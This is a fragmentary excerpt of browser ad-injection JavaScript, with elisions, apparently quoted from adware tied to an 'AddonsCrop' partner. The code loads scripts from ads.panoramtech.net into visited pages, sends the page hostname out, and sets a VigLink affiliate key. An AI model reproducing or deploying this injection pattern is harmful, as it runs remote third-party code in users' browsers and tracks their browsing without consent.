...
(function(){
    ...
    window.panoram_partner_id = 'topaz0001';
    window.panoram_partner_key = '36033';

    for (var i = 0; i < submodules.length; i++) {
        if (submodules[i].length > 0) {
            var script = document.createElement('script');
            script.type = 'text/javascript';
            script.src = '//ads.panoramtech.net//' + submodules[i] + '?client=topaz0001&referrer=http://' + encodeURIComponent(window.location.hostname) + '/';
...
(function(window, undefined){
    ...
    window.panoram_partner_description = 'AddonsCrop';
...
(function() {
    ...
    if (Math.random() < 1.0) {
        ...
        vglnk = { key: '1239a03e19c83de6a2424621cda62b6e', cuid: window.panoram_partner_key };
        (function(d, t) {
